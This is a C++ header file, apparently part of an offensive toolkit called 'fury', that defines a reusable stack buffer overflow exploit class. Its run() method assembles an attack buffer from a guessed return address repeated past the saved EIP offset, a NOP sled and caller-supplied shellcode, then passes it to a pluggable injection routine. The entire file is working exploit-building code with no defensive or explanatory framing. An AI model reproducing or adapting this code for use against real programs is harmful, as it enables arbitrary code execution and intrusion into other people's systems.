#ifndef _fury_stack_overflow_hpp_
#define _fury_stack_overflow_hpp_

#include "types.hpp"

#include <iostream>
#include <string>
#include <unistd.h>

namespace fury {

template<class AddrLocatorPolicy, class InjectPolicy>
class stack_overflow : public AddrLocatorPolicy, public InjectPolicy {
public:
    stack_overflow(int eip_offset, int nop_size = 0) :
        eip_offset(eip_offset),
        nop_size(nop_size)
    {
    }

    void run(const std::string& shellcode) const
    {
        const int nop_offset       = eip_offset + sizeof(addr_type32);
        const int shellcode_offset = eip_offset + nop_size;
        const int shellcode_size   = shellcode.size();
        const int buf_size         = shellcode_offset + shellcode_size;

        char buffer[buf_size];

        const addr_type32 addr = AddrLocatorPolicy::get_addr32();
        std::cout << "Guessing at:   " << (addr_type32*) addr << std::endl;

        addr_type32* ptr = (addr_type32*) buffer;
        for(int i = 0; i < nop_offset/4; ++i)
            ptr[i] = addr;

        for(int i = nop_offset; i < shellcode_offset; ++i)
            buffer[i] = 0x90;

        for(int i = shellcode_offset; i < buf_size; ++i)
            buffer[i] = shellcode[i - shellcode_offset];

        InjectPolicy::inject(buffer);
    }

private:
    const int eip_offset;
    const int nop_size;
};

} // namespace fury

#endif
